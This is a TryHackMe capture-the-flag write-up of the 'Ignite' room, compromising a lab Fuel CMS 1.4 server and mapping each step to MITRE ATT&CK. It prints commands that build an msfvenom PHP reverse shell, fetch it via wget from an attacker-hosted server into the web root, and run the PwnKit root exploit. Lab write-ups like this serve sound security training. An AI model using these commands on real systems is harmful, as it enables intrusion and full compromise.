---
title: "TryHackMe Writeup: Ignite"
date: 2025-11-28
description: "Security assessment of Fuel CMS 1.4. Unauthenticated RCE and privilege escalation via CVE-2021-4034 (PwnKit)."
tags: ["tryhackme", "fuel-cms", "rce", "pwnkit", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

Technical assessment conducted following NIST SP 800-115 standards. The target, running Fuel CMS 1.4, was found vulnerable to unauthenticated Remote Code Execution (RCE). Initial access was leveraged to perform local enumeration, leading to full system compromise via the PwnKit (CVE-2021-4034) exploit.

### Attack Chain (PTES Mapping)

#### 1. Pre-engagement & Intelligence Gathering
Network scanning identified a web server running Fuel CMS version 1.4.
```bash
sudo nmap -Pn -sS -sV -T4 -p- -O 10.65.143.81
```
* **MITRE Technique:** [T1595](https://attack.mitre.org/techniques/T1595/) - Active Scanning.

#### 2. Vulnerability Analysis
The application was identified as Fuel CMS 1.4.1, which is known for a specific RCE vulnerability in its filtering parameters. Default credentials (`admin:admin`) were also present in the CMS dashboard.
* **MITRE Technique:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application.

#### 3. Exploitation (Initial Access)
A PHP reverse shell was generated and uploaded via the RCE vector using a staged delivery:
```bash
# Attacker side:
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php
python3 -m http.server 8000

# Target side (via RCE):
wget http://<IP>:8000/shell.php -O /var/www/html/assets/shell.php
```
A Netcat listener captured the connection, providing a shell as `www-data`.
* **MITRE Technique:** [T1505.003](https://attack.mitre.org/techniques/T1505/003/) - Server Software Component: Web Shell.

#### 4. Post-Exploitation (Privilege Escalation)
System enumeration identified that the host was vulnerable to the PwnKit exploit (CVE-2021-4034).
```bash
./PwnKit
whoami # root
```
* **MITRE Technique:** [T1548.001](https://attack.mitre.org/techniques/T1548/001/) - Abuse Elevation Control Mechanism: Setuid and Setgid.

### Recommendations (NIST SP 800-115)

* **Patch Management:** Update Fuel CMS to the latest secure version and apply kernel/PolicyKit patches to mitigate PwnKit.
* **Configuration Hardening:** Change all default administrative credentials and restrict access to the CMS management interface.
* **Egress Filtering:** Implement strict firewall rules to prevent unauthorized outbound connections (Reverse Shells).